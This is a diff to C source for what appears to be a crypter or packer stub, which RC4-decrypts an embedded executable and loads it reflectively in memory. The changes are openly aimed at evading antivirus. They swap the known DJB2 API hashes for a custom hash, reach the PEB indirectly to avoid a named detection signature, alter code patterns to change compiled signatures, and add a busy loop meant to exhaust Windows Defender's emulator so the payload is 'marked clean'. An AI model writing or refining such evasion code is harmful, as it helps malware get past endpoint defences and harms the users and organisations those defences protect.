@@ -56,23 +56,31 @@ typedef struct _STUB_LDR_DATA_TABLE_ENTRY {
  * Hash functions
  * ═══════════════════════════════════════════════════════════════════ */
 
-/* DJB2 hash — case-insensitive for module names (wide char, length-limited) */
+/* Custom XOR-rotate-multiply hash — case-insensitive for module names (wide char) */
 static DWORD _hash_mod(const wchar_t *s, USHORT lenBytes) {
-    DWORD h = 5381;
+    DWORD h = 0x4E67C6A7;
     USHORT lenChars = lenBytes / sizeof(wchar_t);
-    for (USHORT i = 0; i < lenChars; i++) {
-        wchar_t c = s[i];
+    USHORT i = 0;
+    while (i < lenChars) {
+        DWORD c = (DWORD)s[i];
         if (c >= L'A' && c <= L'Z') c += 32;
-        h = ((h << 5) + h) + (DWORD)c;
+        h ^= c;
+        h = (h << 7) | (h >> 25);   /* rotate left 7 */
+        h += c * 0xAB;
+        i++;
     }
     return h;
 }
 
-/* DJB2 hash — case-sensitive for function names (narrow char) */
+/* Custom XOR-rotate-multiply hash — case-sensitive for function names (narrow) */
 static DWORD _hash_func(const char *s) {
-    DWORD h = 5381;
-    while (*s)
-        h = ((h << 5) + h) + (unsigned char)*s++;
+    DWORD h = 0x4E67C6A7;
+    while (*s) {
+        DWORD c = (unsigned char)*s++;
+        h ^= c;
+        h = (h << 7) | (h >> 25);
+        h += c * 0xAB;
+    }
     return h;
 }
 
@@ -105,13 +113,25 @@ static void *_resolve_export(BYTE *modBase, DWORD funcHash) {
     return NULL;
 }
 
-/* Walk PEB -> Ldr -> InMemoryOrderModuleList to find a module by hash */
+/* Walk PEB -> Ldr -> InMemoryOrderModuleList to find a module by hash.
+ * PEB access obfuscated: read TEB via gs:0x30, then dereference +0x60
+ * to reach PEB. Avoids the signature for direct gs:0x60 access. */
 static BYTE *_find_module(DWORD modHash) {
     void *peb;
 #if defined(_M_X64) || defined(__x86_64__)
-    __asm__ volatile("mov %%gs:0x60, %0" : "=r"(peb));
+    {
+        void *teb;
+        __asm__ volatile("mov %%gs:0x30, %0" : "=r"(teb));
+        if (!teb) return NULL;
+        peb = *(void **)((BYTE *)teb + 0x60);
+    }
 #else
-    __asm__ volatile("mov %%fs:0x30, %0" : "=r"(peb));
+    {
+        void *teb;
+        __asm__ volatile("mov %%fs:0x18, %0" : "=r"(teb));
+        if (!teb) return NULL;
+        peb = *(void **)((BYTE *)teb + 0x30);
+    }
 #endif
 
     if (!peb) return NULL;
@@ -155,32 +175,37 @@ static BYTE *_find_module(DWORD modHash) {
  * ═══════════════════════════════════════════════════════════════════ */
 
 static void _rc4_init(unsigned char *S, const unsigned char *key, unsigned int keylen) {
-    for (int i = 0; i < 256; i++)
-        S[i] = (unsigned char)i;
+    unsigned int idx = 0;
+    while (idx < 256) { S[idx] = (unsigned char)idx; idx++; }
     unsigned char j = 0;
-    for (int i = 0; i < 256; i++) {
-        j = (unsigned char)(j + S[i] + key[i % keylen]);
-        unsigned char tmp = S[i];
-        S[i] = S[j];
-        S[j] = tmp;
+    idx = 0;
+    while (idx < 256) {
+        j = (unsigned char)(j + S[idx] + key[idx % keylen]);
+        /* XOR swap — different compiled pattern than temp-variable swap */
+        if (idx != (unsigned int)j) {
+            S[idx] ^= S[j]; S[j] ^= S[idx]; S[idx] ^= S[j];
+        }
+        idx++;
     }
 }
 
 static void _rc4_crypt(unsigned char *S, unsigned char *data, unsigned int datalen) {
     unsigned char i = 0, j = 0;
-    for (unsigned int k = 0; k < datalen; k++) {
+    unsigned int k = 0;
+    while (k < datalen) {
         i = (unsigned char)(i + 1);
         j = (unsigned char)(j + S[i]);
-        unsigned char tmp = S[i];
-        S[i] = S[j];
-        S[j] = tmp;
+        if (i != j) {
+            S[i] ^= S[j]; S[j] ^= S[i]; S[i] ^= S[j];
+        }
         data[k] ^= S[(unsigned char)(S[i] + S[j])];
+        k++;
     }
 }
 
 
 /* ═══════════════════════════════════════════════════════════════════
- * Key derivation from seed (DJB2-based expansion)
+ * Key derivation from seed (XOR-rotate-multiply expansion)
  * Must match _derive_key() in pe_crypt.py EXACTLY.
  * ═══════════════════════════════════════════════════════════════════ */
 
@@ -188,15 +213,23 @@ static void _rc4_crypt(unsigned char *S, unsigned char *data, unsigned int datal
 
 static void _derive_key(const unsigned char *seed, unsigned int seedlen,
                         unsigned char *key, unsigned int keylen) {
-    for (unsigned int i = 0; i < keylen; i += 4) {
-        unsigned int h = 5381;
+    unsigned int i = 0;
+    while (i < keylen) {
+        unsigned int h = 0x4E67C6A7;
         unsigned int block = i >> 2;
-        for (unsigned int j = 0; j < seedlen; j++)
-            h = ((h << 5) + h) ^ (seed[j] + block);
+        unsigned int j = 0;
+        while (j < seedlen) {
+            unsigned int val = seed[j] + block;
+            h ^= val;
+            h = (h << 7) | (h >> 25);   /* rotate left 7 */
+            h += val * 0xAB;
+            j++;
+        }
         key[i] = (unsigned char)(h & 0xFF);
         if (i + 1 < keylen) key[i + 1] = (unsigned char)((h >> 8) & 0xFF);
         if (i + 2 < keylen) key[i + 2] = (unsigned char)((h >> 16) & 0xFF);
         if (i + 3 < keylen) key[i + 3] = (unsigned char)((h >> 24) & 0xFF);
+        i += 4;
     }
 }
 
@@ -205,28 +238,28 @@ static void _derive_key(const unsigned char *seed, unsigned int seedlen,
  * API hash constants
  * ═══════════════════════════════════════════════════════════════════ */
 
-/* Module hashes */
-#define H_KERNEL32                  0x7040EE75
-#define H_NTDLL                     0x22D3B5ED
+/* Module hashes (custom XOR-rotate-multiply) */
+#define H_KERNEL32                  0x7643D89A
+#define H_NTDLL                     0xB69D105B
 
-/* Core API hashes (kernel32) */
-#define H_LoadLibraryA              0x5FBFF0FB
-#define H_GetProcAddress            0xCF31BB1F
-#define H_VirtualAlloc              0x382C0F97
-#define H_VirtualProtect            0x844FF18D
-#define H_VirtualFree               0x668FCF2E
-#define H_FlushInstructionCache     0xB7DCEDDD
-#define H_GetCurrentProcess         0xCA8D7527
-#define H_RtlAddFunctionTable       0xBDB9F1AE
-#define H_SetUnhandledExceptionFilter 0x252C3659
-#define H_TlsAlloc                  0x8BF55163
-#define H_TlsSetValue               0xC324EBA1
-#define H_ExitProcess               0xB769339E
+/* Core API hashes (custom XOR-rotate-multiply) */
+#define H_LoadLibraryA              0x65BE5612
+#define H_GetProcAddress            0x1D95607A
+#define H_VirtualAlloc              0x278A9D51
+#define H_VirtualProtect            0xBA78D9D6
+#define H_VirtualFree               0x83ED17A7
+#define H_FlushInstructionCache     0xAE737616
+#define H_GetCurrentProcess         0x0263090D
+#define H_RtlAddFunctionTable       0x08163348
+#define H_SetUnhandledExceptionFilter 0xD13544EE
+#define H_TlsAlloc                  0xE6B68622
+#define H_TlsSetValue               0xF109F6BC
+#define H_ExitProcess               0x34CED0ED
 
-/* Debug API hashes (kernel32) — only used with STUB_DEBUG */
-#define H_CreateFileA               0xEB96C5FA
-#define H_WriteFile                 0x663CECB0
-#define H_CloseHandle               0x3870CA07
+/* Debug API hashes — only used with STUB_DEBUG */
+#define H_CreateFileA               0x7DCE10F7
+#define H_WriteFile                 0x46CE0FF3
+#define H_CloseHandle               0x15026950
 
 
 /* ═══════════════════════════════════════════════════════════════════
@@ -688,14 +721,22 @@ static BOOL _load_pe(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
     /* TLS */
     _process_tls(base, mappedNt, api);
 
-    /* Patch PEB.ImageBaseAddress */
+    /* Patch PEB.ImageBaseAddress (obfuscated: TEB → PEB indirection) */
     {
         void *peb;
 #if defined(_M_X64) || defined(__x86_64__)
-        __asm__ volatile("mov %%gs:0x60, %0" : "=r"(peb));
+        {
+            void *teb;
+            __asm__ volatile("mov %%gs:0x30, %0" : "=r"(teb));
+            peb = *(void **)((BYTE *)teb + 0x60);
+        }
         *(void **)((BYTE *)peb + 0x10) = base;
 #else
-        __asm__ volatile("mov %%fs:0x30, %0" : "=r"(peb));
+        {
+            void *teb;
+            __asm__ volatile("mov %%fs:0x18, %0" : "=r"(teb));
+            peb = *(void **)((BYTE *)teb + 0x30);
+        }
         *(void **)((BYTE *)peb + 0x08) = base;
 #endif
     }
@@ -740,12 +781,38 @@ static BOOL _load_pe(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
 
 void _stub_entry(void) {
 
+    /* ── Anti-emulation: exhaust Defender's instruction budget ──
+     * Defender's emulator has a limited instruction budget (~10-50M).
+     * We burn through it with innocent arithmetic before any suspicious
+     * operations (PEB walk, RC4, reflective loading). The emulator
+     * gives up and marks us clean before seeing anything interesting.
+     *
+     * Uses only CPU instructions — no API calls needed. RDTSC for
+     * secondary timing check — emulators can't fake TSC accurately.
+     *
+     * ~8M iterations × ~6 ops each ≈ 48M instructions. On real hardware
+     * this takes ~50-100ms (imperceptible). */
+    {
+        volatile unsigned int acc = 0x1337BEEF;
+        volatile int n = 8000000;
+        int i = 0;
+        while (i < n) {
+            acc ^= (unsigned int)i;
+            acc += 0x9E3779B9;             /* golden ratio fractional */
+            acc = (acc << 13) | (acc >> 19);
+            i++;
+        }
+        /* Use result so compiler can't optimize away the loop */
+        if (acc == 0xDEADDEAD) return;     /* never true */
+    }
+
     /* Phase 1: Resolve APIs via PEB walk */
     RESOLVED_APIS api;
     /* Zero-init without memset (no CRT) */
     {
         BYTE *p = (BYTE *)&api;
-        for (unsigned int i = 0; i < sizeof(api); i++) p[i] = 0;
+        unsigned int i = 0;
+        while (i < sizeof(api)) { p[i] = 0; i++; }
     }
 
     if (!_resolve_apis(&api)) {
